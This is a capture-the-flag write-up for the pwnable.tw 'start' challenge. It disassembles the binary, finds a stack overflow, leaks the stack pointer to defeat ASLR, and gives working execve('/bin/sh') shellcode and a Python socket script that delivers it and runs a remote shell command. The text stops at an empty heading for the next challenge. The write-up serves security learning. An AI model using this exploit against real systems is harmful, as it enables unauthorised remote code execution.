# `pwnable.tw`
 
## 1. `start`

We are given a single binary called "start".  Its disassembly is
remarkably terse:

```
$ objdump -d -Mintel start

start:     file format elf32-i386

Disassembly of section .text:

08048060 <_start>:
 8048060:	54                   	push   esp
 8048061:	68 9d 80 04 08       	push   0x804809d
 8048066:	31 c0                	xor    eax,eax
 8048068:	31 db                	xor    ebx,ebx
 804806a:	31 c9                	xor    ecx,ecx
 804806c:	31 d2                	xor    edx,edx
 804806e:	68 43 54 46 3a       	push   0x3a465443
 8048073:	68 74 68 65 20       	push   0x20656874
 8048078:	68 61 72 74 20       	push   0x20747261
 804807d:	68 73 20 73 74       	push   0x74732073
 8048082:	68 4c 65 74 27       	push   0x2774654c
 8048087:	89 e1                	mov    ecx,esp
 8048089:	b2 14                	mov    dl,0x14
 804808b:	b3 01                	mov    bl,0x1
 804808d:	b0 04                	mov    al,0x4
 804808f:	cd 80                	int    0x80
 8048091:	31 db                	xor    ebx,ebx
 8048093:	b2 3c                	mov    dl,0x3c
 8048095:	b0 03                	mov    al,0x3
 8048097:	cd 80                	int    0x80
 8048099:	83 c4 14             	add    esp,0x14
 804809c:	c3                   	ret    

0804809d <_exit>:
 804809d:	5c                   	pop    esp
 804809e:	31 c0                	xor    eax,eax
 80480a0:	40                   	inc    eax
 80480a1:	cd 80                	int    0x80
```

This looks like hand-rolled assembly.  We notice that the second
syscall at `0x8048097` will read 60 (0x3c) bytes from stdin to the
location stored in `esp`.  After this, we add 20 (0x14) bytes to esp
and then ret.  Thus if we input 20 'A's and then four bytes, those
next four bytes will overwrite the return address.

Thus in principle, if we include shellcode in our input, we can send
bytes 20-23 as the address of this shellcode.  However, we do not know
the address of our shellcode, since it is on the stack and ASLR is
enabled.

Because ASLR is enabled, the only addresses we know are the addresses
in the code.  Thus we have only a few options for what we can do:

* We can restart the whole program (by returning to `0x08048060`)

* We can print the top 20 bytes off the stack (by returning to
  `0x08048087`)

* We can read 60 more bytes of input into the location we just read
  (by returning to `0x08048093`)

These are only some basic options--for example, we could also return
to the middle of an instruction (for example, maybe the push
instructions) and find some instructions that don't appear in the
disassembly.  However, looking at only our basic options, we already
notice that the next thing on the stack after the return address we
are overwriting will in fact be the value of `esp`, as it was pushed
at the very start of the program!  Thus if we return to `0x08048087`,
we will see as the first four bytes printed, the old esp, i.e. the
stack pointer at the start of the program.

Furthermore, after this is printed, the program will again read 60
bytes to the current `esp` (which will be the same as the printed
`esp`).  So if on this second input we provide padding, a new return
address (based on the outputted esp), and then some shellcode, we
should be sorted:

```
"A"*20 + [4 byte return address] + [shellcode (up to 36 bytes)]
```

So there are two issues: what should our actual return address be, and
what shellcode do we use?

The start of this buffer will be the current `esp`, which is also the
original `esp` value which was outputted by the pfor.  The shellcode
starts at 24 bytes after this, so our input will look like:

```
"A"*20 + [outputted esp value + 24] + [shellcode (up to 36 bytes)]
```

Finally, since it seems stdin and stdout are here just being forwarded
to a socket, we should be able to just use a basic `execve("/bin/sh")`
shellcode to do the job.  For example:

```
$ cat ex.s
bits 32

mov byte al, 11
xor edx,edx
push edx
push 0x68732f2f
push 0x6e69622f
mov ebx, esp
push edx
mov edx, esp
push ebx
mov ecx, esp
int 0x80
$ nasm -f bin -o /dev/stdout ex.s | wc -c
25
$ nasm -f bin -o ex ex.s
```

So this shellcode (now stored in the file `ex`) will be 25 bytes and
will fit just fine in our required space of 36 bytes.

So we can finish this off with a simple python program, `ex.py`, which
will take in three arguments:

* Host to connect to
* Port to connect on
* Shell command to run

```
$ cat ex.py
import sys, socket, time

f1 = open("p1", "rb")
p1 = f1.read()
f2 = open("ex", "rb")
p2 = f2.read()

ip = sys.argv[1]
port = int(sys.argv[2])
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip, port))
print("GOT1",s.recv(512))
s.send(p1)
data = s.recv(512)
print("GOT",data)
addr = int.from_bytes(data[:4], byteorder="little")
print(hex(addr))
addr += 24
ab = addr.to_bytes(4, byteorder="little")
time.sleep(4)
s.send(ab*7 + bytes([0x90]*6) + p2)
time.sleep(1)
s.send(bytes(sys.argv[3] + "\n","ascii"))
print("RX",s.recv(512))
```



## 2. `orw`
